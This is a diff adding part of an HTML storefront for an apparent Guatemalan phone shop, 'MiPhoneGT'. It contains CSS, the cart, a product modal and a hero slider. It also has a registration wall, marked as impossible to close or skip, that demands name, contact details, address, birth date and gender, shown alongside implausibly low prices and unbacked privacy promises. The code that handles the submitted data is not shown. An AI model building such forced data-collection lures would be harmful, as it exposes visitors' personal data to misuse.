+  .cart-item-remove {
+    background: none;
+    border: none;
+    color: var(--text-muted);
+    cursor: pointer;
+    font-size: 1rem;
+    padding: 4px;
+    transition: color 0.2s;
+    flex-shrink: 0;
+  }
+  .cart-item-remove:hover { color: var(--danger); }
+
+  .cart-footer {
+    padding: 20px 24px;
+    border-top: 1px solid var(--border);
+    background: var(--surface2);
+  }
+
+  .cart-summary-row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 8px;
+    font-size: 0.85rem;
+    color: var(--text-muted);
+  }
+
+  .cart-total-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 12px 0;
+    border-top: 1px solid var(--border);
+    margin-top: 8px;
+    margin-bottom: 16px;
+  }
+
+  .cart-total-row .total-label {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 1.1rem;
+  }
+
+  .cart-total-row .total-amount {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 1.3rem;
+    color: var(--accent);
+  }
+
+  .checkout-btn {
+    width: 100%;
+    background: linear-gradient(135deg, var(--accent), #0088cc);
+    border: none;
+    color: var(--primary);
+    padding: 14px;
+    border-radius: 12px;
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 1rem;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    box-shadow: 0 4px 20px rgba(0,212,255,0.3);
+  }
+  .checkout-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 28px rgba(0,212,255,0.4); }
+
+  .empty-cart {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 200px;
+    color: var(--text-muted);
+    gap: 12px;
+    text-align: center;
+  }
+
+  .empty-cart-icon { font-size: 3.5rem; }
+  .empty-cart p { font-size: 0.9rem; }
+
+  /* PRODUCT MODAL */
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.8);
+    z-index: 3000;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    backdrop-filter: blur(8px);
+    padding: 20px;
+  }
+  .modal-overlay.open { display: flex; }
+
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    max-width: 900px;
+    width: 100%;
+    max-height: 90vh;
+    overflow-y: auto;
+    box-shadow: 0 30px 100px rgba(0,0,0,0.7);
+    position: relative;
+  }
+
+  .modal-close {
+    position: absolute;
+    top: 16px;
+    right: 16px;
+    background: var(--surface3);
+    border: none;
+    color: var(--text);
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    cursor: pointer;
+    font-size: 1.1rem;
+    z-index: 10;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background 0.2s;
+  }
+  .modal-close:hover { background: var(--danger); }
+
+  .modal-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0;
+  }
+
+  .modal-img-side {
+    background: var(--surface3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 10rem;
+    padding: 40px;
+    border-radius: 20px 0 0 20px;
+    filter: drop-shadow(0 20px 40px rgba(0,0,0,0.5));
+  }
+
+  .modal-info-side {
+    padding: 32px;
+  }
+
+  .modal-brand {
+    font-size: 0.8rem;
+    color: var(--accent);
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 8px;
+  }
+
+  .modal-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.6rem;
+    font-weight: 800;
+    margin-bottom: 12px;
+    line-height: 1.2;
+  }
+
+  .modal-rating {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+
+  .modal-price-section {
+    background: var(--surface2);
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 20px;
+  }
+
+  .modal-price-big {
+    font-family: 'Syne', sans-serif;
+    font-size: 2rem;
+    font-weight: 800;
+    color: var(--text);
+    margin-bottom: 4px;
+  }
+
+  .modal-price-detail {
+    font-size: 0.8rem;
+    color: var(--text-muted);
+  }
+
+  .modal-specs {
+    margin-bottom: 20px;
+  }
+
+  .modal-specs h4 {
+    font-family: 'Syne', sans-serif;
+    font-size: 0.9rem;
+    font-weight: 700;
+    margin-bottom: 10px;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  .spec-row {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 6px;
+    font-size: 0.83rem;
+  }
+
+  .spec-key { color: var(--text-muted); min-width: 80px; }
+  .spec-val { color: var(--text); font-weight: 500; }
+
+  .color-options {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+
+  .color-dot {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    cursor: pointer;
+    border: 2px solid transparent;
+    transition: all 0.2s;
+  }
+  .color-dot.active, .color-dot:hover { border-color: var(--accent); transform: scale(1.15); }
+
+  .storage-options {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+
+  .storage-btn {
+    background: var(--surface3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 6px 14px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 0.8rem;
+    transition: all 0.2s;
+  }
+  .storage-btn.active, .storage-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+  .modal-actions {
+    display: flex;
+    gap: 10px;
+  }
+
+  .modal-actions .btn-primary { flex: 1; }
+
+  /* TOAST */
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: var(--surface2);
+    border: 1px solid var(--accent);
+    border-radius: 12px;
+    padding: 14px 24px;
+    font-weight: 600;
+    font-size: 0.9rem;
+    z-index: 9999;
+    transition: transform 0.3s ease;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.4), 0 0 0 1px rgba(0,212,255,0.1);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    white-space: nowrap;
+  }
+  .toast.show { transform: translateX(-50%) translateY(0); }
+  .toast .toast-icon { font-size: 1.2rem; }
+
+  /* FOOTER */
+  footer {
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+    padding: 48px 24px 24px;
+    margin-top: 40px;
+  }
+
+  .footer-grid {
+    display: grid;
+    grid-template-columns: 2fr 1fr 1fr 1fr;
+    gap: 40px;
+    max-width: 1400px;
+    margin: 0 auto 40px;
+  }
+
+  .footer-brand .logo { font-size: 1.4rem; display: inline-block; margin-bottom: 12px; }
+  .footer-brand p { font-size: 0.85rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 16px; }
+
+  .social-links { display: flex; gap: 10px; }
+  .social-btn {
+    background: var(--surface3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    width: 36px;
+    height: 36px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-size: 1rem;
+    text-decoration: none;
+  }
+  .social-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+  .footer-col h4 {
+    font-family: 'Syne', sans-serif;
+    font-size: 0.9rem;
+    font-weight: 700;
+    margin-bottom: 14px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  .footer-col a {
+    display: block;
+    color: var(--text-muted);
+    font-size: 0.85rem;
+    margin-bottom: 8px;
+    cursor: pointer;
+    text-decoration: none;
+    transition: color 0.2s;
+  }
+  .footer-col a:hover { color: var(--accent); }
+
+  .footer-bottom {
+    max-width: 1400px;
+    margin: 0 auto;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 0.8rem;
+    color: var(--text-muted);
+  }
+
+  .payment-icons {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+  }
+
+  .pay-icon {
+    background: var(--surface3);
+    border: 1px solid var(--border);
+    padding: 4px 8px;
+    border-radius: 6px;
+    font-size: 0.75rem;
+    font-weight: 600;
+    color: var(--text);
+  }
+
+  /* NOTIFICATION DOT */
+  .notif-dot {
+    width: 8px;
+    height: 8px;
+    background: var(--danger);
+    border-radius: 50%;
+    position: absolute;
+    top: 6px;
+    right: 6px;
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+
+  /* SEARCH RESULTS */
+  #search-results-section {
+    display: none;
+  }
+
+  /* SORT BAR */
+  .sort-bar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 20px;
+    padding: 14px 16px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+  }
+
+  .sort-bar span { font-size: 0.85rem; color: var(--text-muted); }
+
+  .sort-bar select {
+    background: var(--surface3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 6px 12px;
+    border-radius: 8px;
+    font-family: inherit;
+    font-size: 0.85rem;
+    cursor: pointer;
+    outline: none;
+  }
+
+  @media (max-width: 900px) {
+    .hero-image { right: 24px; }
+    .hero-image img { max-height: 220px; max-width: 180px; }
+    .hero-title { font-size: 2rem; }
+    .hero-content { max-width: 360px; }
+    .banner-row { grid-template-columns: 1fr 1fr; }
+    .modal-grid { grid-template-columns: 1fr; }
+    .modal-img-side { border-radius: 20px 20px 0 0; font-size: 7rem; padding: 30px; }
+    .modal-info-side { padding: 20px; }
+    .shop-layout { grid-template-columns: 1fr; }
+    .sidebar { display: none; }
+    .header-btn .label { display: none; }
+    .location-btn { display: none; }
+  }
+
+  @media (max-width: 700px) {
+    /* Header */
+    .header-top { padding: 10px 14px; gap: 8px; }
+    .logo { font-size: 1.3rem; }
+    .search-bar select { display: none; }
+    .header-btn strong { font-size: 0; }
+    .header-btn .icon { font-size: 1.3rem; }
+    .header-btn { padding: 8px; }
+
+    /* Nav */
+    .nav-inner { padding: 0 14px; }
+    .nav-item { padding: 10px 10px; font-size: 0.78rem; }
+
+    /* Hero */
+    .hero { height: 240px; margin: -32px -14px 24px; }
+    .hero-title { font-size: 1.4rem; }
+    .hero-desc { display: none; }
+    .hero-price { font-size: 1.2rem; }
+    .hero-image { right: 8px; }
+    .hero-image img { max-height: 180px; max-width: 140px; }
+    .hero-actions { flex-direction: column; gap: 8px; }
+    .hero-actions .btn-primary, .hero-actions .btn-outline { padding: 10px 18px; font-size: 0.82rem; }
+    .hero-content { padding: 0; max-width: calc(100% - 160px); }
+    .hero-slide { padding: 0 14px; }
+    .hero-arrow { display: none; }
+
+    /* Main */
+    .main { padding: 24px 14px; }
+
+    /* Categories */
+    .cat-pill { min-width: 72px; padding: 12px 14px; }
+    .cat-pill .cat-icon { font-size: 1.5rem; }
+
+    /* Banner row */
+    .banner-row { grid-template-columns: 1fr; gap: 12px; }
+
+    /* Products */
+    .products-grid { grid-template-columns: repeat(2, 1fr); gap: 12px; }
+    .product-img-wrap { height: 160px; }
+    .product-img { max-width: 90%; max-height: 90%; }
+    .product-emoji, .product-emoji-fallback { font-size: 4.5rem; }
+    .product-info { padding: 10px; }
+    .product-name { font-size: 0.82rem; }
+    .product-specs { display: none; }
+    .product-price { font-size: 1rem; }
+    .add-cart-btn { font-size: 0.75rem; padding: 8px 4px; }
+
+    /* Cart */
+    .cart-panel { width: 100%; border-radius: 0; }
+
+    /* Modal */
+    .modal { margin: 10px; border-radius: 16px; }
+    .modal-title { font-size: 1.2rem; }
+    .modal-price-big { font-size: 1.5rem; }
+    .modal-actions { flex-direction: column; }
+
+    /* Footer */
+    .footer-grid { grid-template-columns: 1fr; gap: 20px; }
+    .footer-bottom { flex-direction: column; gap: 12px; text-align: center; }
+    .payment-icons { flex-wrap: wrap; justify-content: center; }
+
+    /* Sort bar */
+    .sort-bar { flex-direction: column; gap: 8px; align-items: flex-start; }
+
+    /* Popup responsive */
+    .reg-card { border-radius: 18px; }
+    .reg-header { padding: 20px 18px 16px; }
+    .reg-logo { font-size: 1.5rem; }
+    .reg-header h2 { font-size: 1.05rem; }
+    .reg-header p { font-size: 0.78rem; }
+    .reg-body { padding: 16px 18px 20px; }
+    .form-row { grid-template-columns: 1fr; gap: 0; }
+    .reg-benefits { gap: 6px; }
+    .reg-benefit { font-size: 0.68rem; padding: 3px 8px; }
+  }
+
+  @media (max-width: 400px) {
+    .hero { height: 210px; }
+    .hero-title { font-size: 1.2rem; }
+    .hero-image img { max-height: 150px; max-width: 120px; }
+    .products-grid { grid-template-columns: 1fr 1fr; gap: 10px; }
+    .product-img-wrap { height: 130px; }
+    .hero-price { font-size: 1rem; }
+    .logo { font-size: 1.1rem; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ======================================================
+     REGISTRO OBLIGATORIO — no se puede cerrar ni saltar
+     ====================================================== -->
+<div id="register-wall">
+  <div class="reg-card">
+
+    <!-- HEADER -->
+    <div class="reg-header">
+      <span class="reg-logo">MiPhone<span>GT</span></span>
+      <h2>¡Crea tu cuenta gratis!</h2>
+      <p>Regístrate para ver precios exclusivos, envíos rápidos y las mejores ofertas de tecnología en Guatemala 🇬🇹</p>
+      <div class="reg-benefits">
+        <span class="reg-benefit">🚚 Envío gratis</span>
+        <span class="reg-benefit">💳 24 cuotas</span>
+        <span class="reg-benefit">🎁 Ofertas exclusivas</span>
+        <span class="reg-benefit">🛡️ Garantía oficial</span>
+      </div>
+    </div>
+
+    <!-- FORMULARIO -->
+    <div class="reg-body" id="reg-form-body">
+
+      <form id="reg-form" onsubmit="submitRegister(event)" novalidate autocomplete="off">
+
+        <!-- Nombre completo -->
+        <div class="form-group">
+          <label>Nombre completo <span class="req">*</span></label>
+          <input type="text" id="reg-nombre" name="nombre_completo" placeholder="Ej. Carlos Mendoza López" maxlength="80">
+          <div class="field-error" id="err-nombre">Por favor ingresa tu nombre completo</div>
+        </div>
+
+        <!-- Fila: email + teléfono -->
+        <div class="form-row">
+          <div class="form-group">
+            <label>Correo electrónico <span class="req">*</span></label>
+            <input type="email" id="reg-email" name="correo" placeholder="tucorreo@gmail.com">
+            <div class="field-error" id="err-email">Ingresa un correo válido</div>
+          </div>
+          <div class="form-group">
+            <label>Teléfono <span class="req">*</span></label>
+            <input type="tel" id="reg-tel" name="telefono" placeholder="5555-1234" maxlength="15">
+            <div class="field-error" id="err-tel">Ingresa tu número de teléfono</div>
+          </div>
+        </div>
+
+        <!-- Fila: departamento + municipio -->
+        <div class="form-row">
+          <div class="form-group">
+            <label>Departamento <span class="req">*</span></label>
+            <select id="reg-depto" name="departamento" onchange="updateMunicipios()">
+              <option value="">Selecciona...</option>
+              <option>Guatemala</option>
+              <option>Sacatepéquez</option>
+              <option>Chimaltenango</option>
+              <option>Escuintla</option>
+              <option>Santa Rosa</option>
+              <option>Sololá</option>
+              <option>Totonicapán</option>
+              <option>Quetzaltenango</option>
+              <option>Suchitepéquez</option>
+              <option>Retalhuleu</option>
+              <option>San Marcos</option>
+              <option>Huehuetenango</option>
+              <option>Quiché</option>
+              <option>Baja Verapaz</option>
+              <option>Alta Verapaz</option>
+              <option>Petén</option>
+              <option>Izabal</option>
+              <option>Zacapa</option>
+              <option>Chiquimula</option>
+              <option>Jalapa</option>
+              <option>Jutiapa</option>
+              <option>El Progreso</option>
+            </select>
+            <div class="field-error" id="err-depto">Selecciona tu departamento</div>
+          </div>
+          <div class="form-group">
+            <label>Municipio <span class="req">*</span></label>
+            <input type="text" id="reg-municipio" name="municipio" placeholder="Tu municipio">
+            <div class="field-error" id="err-municipio">Ingresa tu municipio</div>
+          </div>
+        </div>
+
+        <!-- Dirección de entrega -->
+        <div class="form-group">
+          <label>Dirección de entrega <span class="req">*</span></label>
+          <textarea id="reg-direccion" name="direccion_entrega" placeholder="Zona, colonia, calle, número de casa o apartamento..."></textarea>
+          <div class="field-error" id="err-dir">Ingresa tu dirección de entrega completa</div>
+        </div>
+
+        <!-- Fila: fecha nacimiento + género -->
+        <div class="form-row">
+          <div class="form-group">
+            <label>Fecha de nacimiento <span class="req">*</span></label>
+            <input type="date" id="reg-fecha" name="fecha_nacimiento" max="">
+            <div class="field-error" id="err-fecha">Ingresa tu fecha de nacimiento</div>
+          </div>
+          <div class="form-group">
+            <label>Género <span class="req">*</span></label>
+            <select id="reg-genero" name="genero">
+              <option value="">Selecciona...</option>
+              <option>Masculino</option>
+              <option>Femenino</option>
+              <option>Prefiero no decir</option>
+            </select>
+            <div class="field-error" id="err-genero">Selecciona una opción</div>
+          </div>
+        </div>
+
+        <!-- NIT (opcional) -->
+        <div class="form-group">
+          <label>NIT / DPI <span style="color:var(--text-muted);font-weight:400;">(opcional, para facturación)</span></label>
+          <input type="text" id="reg-nit" name="nit_dpi" placeholder="CF o tu NIT de Guatemala" maxlength="20">
+        </div>
+
+        <button type="submit" class="reg-submit-btn" id="reg-submit-btn">
+          <span id="reg-btn-text">✅ Crear mi cuenta gratis</span>
+          <div class="btn-spinner" id="reg-spinner"></div>
+        </button>
+
+        <p class="reg-terms">
+          Al registrarte aceptas nuestros <a onclick="showToast('📋 Términos de Servicio de MiPhoneGT')">Términos de Servicio</a>
+          y <a onclick="showToast('🔒 Política de Privacidad')">Política de Privacidad</a>.
+          Tus datos están protegidos y no serán compartidos con terceros.
+        </p>
+
+      </form>
+
+      <div class="reg-no-skip">🔒 Debes completar el registro para acceder a la tienda</div>
+    </div>
+
+    <!-- PANTALLA DE ÉXITO -->
+    <div class="reg-success" id="reg-success-screen">
+      <div class="reg-success-icon">🎉</div>
+      <h3>¡Bienvenido a MiPhoneGT!</h3>
+      <p id="reg-success-name">Tu cuenta ha sido creada exitosamente. Ya puedes disfrutar de las mejores ofertas de tecnología en Guatemala.</p>
+      <button class="reg-success-btn" onclick="enterStore()">🛒 Entrar a la Tienda →</button>
+    </div>
+
+  </div>
+</div>
+
+<!-- PROMO STRIP -->
+<div class="promo-strip">
+  🚀 ENVÍO GRATIS en pedidos +Q500 · 📱 iPhone 16 Pro Max YA DISPONIBLE · ⚡ Hasta 24 cuotas sin intereses · 🛡️ Garantía oficial 1 año
+</div>
+
+<!-- HEADER -->
+<header>
+  <div class="header-top">
+    <a class="logo" href="#" onclick="goHome()">MiPhone<span>GT</span></a>
+    
+    <div class="location-btn" onclick="showToast('📍 Entrega disponible en toda Guatemala')">
+      <span class="label">Entregar en</span>
+      <strong>🇬🇹 Guatemala City</strong>
+    </div>
+
+    <div class="search-bar">
+      <select id="search-category">
+        <option>Todo</option>
+        <option>Teléfonos</option>
+        <option>Tablets</option>
+        <option>Accesorios</option>
+        <option>Wearables</option>
+      </select>
+      <input type="text" id="search-input" placeholder="Buscar teléfonos, tablets, accesorios..." oninput="liveSearch(this.value)" onkeydown="if(event.key==='Enter') doSearch()">
+      <button class="search-btn" onclick="doSearch()">🔍</button>
+    </div>
+
+    <div class="header-actions">
+      <button class="header-btn" onclick="showToast('👤 Iniciar sesión próximamente')">
+        <span class="label">Hola, Visitante</span>
+        <strong>Mi Cuenta ▾</strong>
+      </button>
+      <button class="header-btn" onclick="showToast('❤️ Lista de deseos')">
+        <span class="icon">❤️</span>
+        <strong>Favoritos</strong>
+      </button>
+      <button class="header-btn" onclick="openCart()" style="position:relative;">
+        <span class="icon">🛒</span>
+        <strong>Carrito</strong>
+        <div class="cart-badge" id="cart-count">0</div>
+      </button>
+    </div>
+  </div>
+
+  <div class="nav-bar">
+    <div class="nav-inner">
+      <div class="nav-item active" onclick="setNav(this,'all')">☰ Todo</div>
+      <div class="nav-item" onclick="setNav(this,'iphone')">📱 iPhone</div>
+      <div class="nav-item" onclick="setNav(this,'samsung')">📱 Samsung</div>
+      <div class="nav-item" onclick="setNav(this,'xiaomi')">📱 Xiaomi</div>
+      <div class="nav-item" onclick="setNav(this,'tablets')">📟 Tablets</div>
+      <div class="nav-item" onclick="setNav(this,'wearables')">⌚ Wearables</div>
+      <div class="nav-item" onclick="setNav(this,'accesorios')">🎧 Accesorios</div>
+      <div class="nav-item" onclick="setNav(this,'ofertas')" style="color:var(--danger)">🔥 Ofertas</div>
+      <div class="nav-item" onclick="showToast('🏪 Vendedores verificados GT')">🏪 Vendedores</div>
+      <div class="nav-item" onclick="showToast('🎁 Tarjetas de regalo GT')">🎁 Regalo</div>
+    </div>
+  </div>
+</header>
+
+<!-- CART OVERLAY & PANEL -->
+<div class="cart-overlay" id="cart-overlay" onclick="closeCart()"></div>
+<div class="cart-panel" id="cart-panel">
+  <div class="cart-header">
+    <h2>🛒 Tu Carrito</h2>
+    <button class="close-btn" onclick="closeCart()">✕</button>
+  </div>
+  <div class="cart-items" id="cart-items-container">
+    <div class="empty-cart" id="empty-cart-msg">
+      <span class="empty-cart-icon">🛒</span>
+      <p>Tu carrito está vacío</p>
+      <small style="color:var(--text-muted)">Agrega productos para comenzar</small>
+    </div>
+  </div>
+  <div class="cart-footer" id="cart-footer" style="display:none;">
+    <div class="cart-summary-row"><span>Subtotal</span><span id="cart-subtotal">Q0.00</span></div>
+    <div class="cart-summary-row"><span>Envío</span><span style="color:var(--success)">GRATIS</span></div>
+    <div class="cart-summary-row"><span>IVA (12%)</span><span id="cart-tax">Q0.00</span></div>
+    <div class="cart-total-row">
+      <span class="total-label">Total</span>
+      <span class="total-amount" id="cart-total">Q0.00</span>
+    </div>
+    <button class="checkout-btn" onclick="checkout()">Proceder al Pago →</button>
+  </div>
+</div>
+
+<!-- PRODUCT MODAL -->
+<div class="modal-overlay" id="modal-overlay" onclick="closeModal(event)">
+  <div class="modal" id="product-modal">
+    <button class="modal-close" onclick="closeModal()">✕</button>
+    <div class="modal-grid">
+      <div class="modal-img-side" id="modal-img">📱</div>
+      <div class="modal-info-side">
+        <div class="modal-brand" id="modal-brand">Apple</div>
+        <h2 class="modal-title" id="modal-title">iPhone 16 Pro Max</h2>
+        <div class="modal-rating">
+          <span class="stars">★★★★★</span>
+          <span class="rating-count" id="modal-reviews">(2,341 reseñas)</span>
+          <span style="color:var(--success);font-size:0.8rem;font-weight:600;" id="modal-stock">✓ En stock</span>
+        </div>
+        <div class="modal-price-section">
+          <div class="modal-price-big" id="modal-price">Q8,499</div>
+          <div class="modal-price-detail" id="modal-installment">o 24 cuotas de Q354/mes sin intereses</div>
+        </div>
+        <div class="modal-specs" id="modal-specs-container"></div>
+        <div style="margin-bottom:12px;">
+          <div class="filter-label">Color</div>
+          <div class="color-options" id="modal-colors"></div>
+        </div>
+        <div style="margin-bottom:20px;">
+          <div class="filter-label">Almacenamiento</div>
+          <div class="storage-options" id="modal-storage"></div>
+        </div>
+        <div class="modal-actions">
+          <button class="btn-primary" id="modal-add-btn" onclick="addToCartFromModal()">🛒 Agregar al Carrito</button>
+          <button class="btn-outline" onclick="showToast('💳 Pago directo pronto disponible')">⚡ Comprar Ahora</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast">
+  <span class="toast-icon">✅</span>
+  <span id="toast-msg">Producto agregado al carrito</span>
+</div>
+
+<!-- MAIN -->
+<main class="main">
+
+  <!-- HOME CONTENT -->
+  <div id="home-content">
+
+    <!-- HERO SLIDER -->
+    <div class="hero" style="margin:-32px -24px 32px; border-radius:0;">
+      <div class="hero-slide hero-slide-1 active" id="slide-0">
+        <div class="hero-bg-glow" style="background:radial-gradient(#00d4ff,transparent);"></div>
+        <div class="hero-content">
+          <div class="hero-tag">🆕 Nuevo Lanzamiento 2025</div>
+          <h1 class="hero-title">iPhone 16 <span class="highlight">Pro Max</span></h1>
+          <p class="hero-desc">La cámara más avanzada de Apple. Chip A18 Pro. Botón de Cámara. Titanio de grado aeroespacial.</p>
+          <div class="hero-price">Q4,299 <span>Desde</span></div>
+          <div class="hero-actions">
+            <button class="btn-primary" onclick="openProductById('iphone-16-pro-max')">Ver Producto</button>
+            <button class="btn-outline" onclick="setNav(document.querySelector('[onclick*=iphone]'), 'iphone')">Ver iPhone</button>
+          </div>
+        </div>
+        <div class="hero-image"><img src="https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-16-pro-finish-select-202409-6-9inch-deserttitanium?wid=800&hei=800&fmt=p-jpg&qlt=80&.v=1725379514167" alt="iPhone 16 Pro Max" style="max-height:320px;max-width:280px;object-fit:contain;filter:drop-shadow(0 20px 60px rgba(0,212,255,0.35));" onerror="this.outerHTML='<span style=font-size:10rem>📱</span>'"></div>
+      </div>
+
+      <div class="hero-slide hero-slide-2" id="slide-1">
+        <div class="hero-bg-glow" style="background:radial-gradient(#10b981,transparent);"></div>
+        <div class="hero-content">
+          <div class="hero-tag" style="background:rgba(16,185,129,0.15);border-color:rgba(16,185,129,0.3);color:#10b981;">🌟 Mejor Vendido</div>
+          <h1 class="hero-title">Samsung <span class="highlight" style="background:linear-gradient(#10b981,#34d399);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">Galaxy S25 Ultra</span></h1>
+          <p class="hero-desc">S Pen integrado. Galaxy AI. 200MP. La evolución definitiva de Samsung.</p>
+          <div class="hero-price" style="color:#10b981;">Q3,799 <span>Desde</span></div>
+          <div class="hero-actions">
+            <button class="btn-primary" style="background:linear-gradient(135deg,#10b981,#059669);" onclick="openProductById('s25-ultra')">Ver Producto</button>
+            <button class="btn-outline" onclick="setNavFilter('samsung')">Ver Samsung</button>
+          </div>
+        </div>
+        <div class="hero-image" style="filter:drop-shadow(0 20px 60px rgba(16,185,129,0.3));"><img src="https://images.samsung.com/is/image/samsung/p6pim/levant/2501/gallery/levant-galaxy-s25-ultra-s938-sm-s938bzahmid-thumb-542282787?$650_519_PNG$" alt="Galaxy S25 Ultra" style="max-height:300px;max-width:260px;object-fit:contain;" onerror="this.outerHTML='<span style=font-size:10rem>📲</span>'"></div>
+      </div>
+
+      <div class="hero-slide hero-slide-3" id="slide-2">
+        <div class="hero-bg-glow" style="background:radial-gradient(#f59e0b,transparent);"></div>
+        <div class="hero-content">
+          <div class="hero-tag" style="background:rgba(245,158,11,0.15);border-color:rgba(245,158,11,0.3);color:#f59e0b;">🔥 Oferta del Día</div>
+          <h1 class="hero-title">iPad <span class="highlight" style="background:linear-gradient(#f59e0b,#f97316);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">Pro M4</span></h1>
+          <p class="hero-desc">Pantalla Ultra Retina XDR. Chip M4. Hasta 16 horas de batería. La tablet más poderosa.</p>
+          <div class="hero-price" style="color:#f59e0b;">Q3,199 <span>Antes Q3,799</span></div>
+          <div class="hero-actions">
+            <button class="btn-primary" style="background:linear-gradient(135deg,#f59e0b,#f97316);" onclick="openProductById('ipad-pro-m4')">Ver Oferta</button>
+            <button class="btn-outline" onclick="setNavFilter('tablets')">Ver Tablets</button>
+          </div>
+        </div>
+        <div class="hero-image" style="filter:drop-shadow(0 20px 60px rgba(245,158,11,0.3));"><img src="https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/ipad-pro-finish-select-202405-13inch-silver-wifi?wid=800&hei=800&fmt=p-jpg&qlt=95&.v=1713920820745" alt="iPad Pro M4" style="max-height:300px;max-width:280px;object-fit:contain;" onerror="this.outerHTML='<span style=font-size:10rem>📟</span>'"></div>
+      </div>
+
+      <button class="hero-arrow left" onclick="changeSlide(-1)">‹</button>
+      <button class="hero-arrow right" onclick="changeSlide(1)">›</button>
+      <div class="hero-dots">
+        <div class="hero-dot active" onclick="goSlide(0)"></div>
+        <div class="hero-dot" onclick="goSlide(1)"></div>
+        <div class="hero-dot" onclick="goSlide(2)"></div>
+      </div>
+    </div>
+
+    <!-- CATEGORIES -->
+    <div class="categories" id="cat-pills">
+      <div class="cat-pill active" onclick="filterCat(this,'all')"><span class="cat-icon">🏠</span><span class="cat-name">Todo</span></div>
+      <div class="cat-pill" onclick="filterCat(this,'iphone')"><span class="cat-icon">🍎</span><span class="cat-name">iPhone</span></div>
+      <div class="cat-pill" onclick="filterCat(this,'samsung')"><span class="cat-icon">🌌</span><span class="cat-name">Samsung</span></div>
+      <div class="cat-pill" onclick="filterCat(this,'xiaomi')"><span class="cat-icon">📱</span><span class="cat-name">Xiaomi</span></div>
+      <div class="cat-pill" onclick="filterCat(this,'google')"><span class="cat-icon">🔵</span><span class="cat-name">Google</span></div>
+      <div class="cat-pill" onclick="filterCat(this,'tablets')"><span class="cat-icon">📟</span><span class="cat-name">Tablets</span></div>
+      <div class="cat-pill" onclick="filterCat(this,'wearables')"><span class="cat-icon">⌚</span><span class="cat-name">Wearables</span></div>
+      <div class="cat-pill" onclick="filterCat(this,'accesorios')"><span class="cat-icon">🎧</span><span class="cat-name">Accesorios</span></div>
+    </div>
+
+    <!-- MINI BANNERS -->
+    <div class="banner-row">
+      <div class="mini-banner" onclick="showToast('💳 Hasta 24 cuotas sin intereses con tarjeta GT')">
+        <div class="mb-glow" style="background:var(--accent);"></div>
+        <span class="mini-banner-icon">💳</span>
+        <h3>24 Cuotas Sin Intereses</h3>
+        <p>Paga cómodo con tu tarjeta de crédito. Banrural, BAC, Crédito Hipotecario y más.</p>
+      </div>
+      <div class="mini-banner" onclick="showToast('🚚 Envío gratis en pedidos mayores a Q500')">
+        <div class="mb-glow" style="background:var(--success);"></div>
+        <span class="mini-banner-icon">🚚</span>
+        <h3>Envío Express Gratis</h3>
+        <p>Entrega en 24-48 horas en Guatemala City. Todo el país en 3-5 días.</p>
+      </div>
+      <div class="mini-banner" onclick="showToast('🛡️ Garantía oficial de 1 año incluida')">
+        <div class="mb-glow" style="background:var(--accent2);"></div>
+        <span class="mini-banner-icon">🛡️</span>
+        <h3>Garantía Oficial 1 Año</h3>
+        <p>Todos nuestros productos son 100% originales con garantía oficial del fabricante.</p>
+      </div>
+    </div>
+
+    <!-- FEATURED PRODUCTS -->
+    <div class="section-header">
+      <h2 class="section-title">Productos Destacados</h2>
+      <a class="see-all" onclick="showAll()">Ver todos →</a>
+    </div>
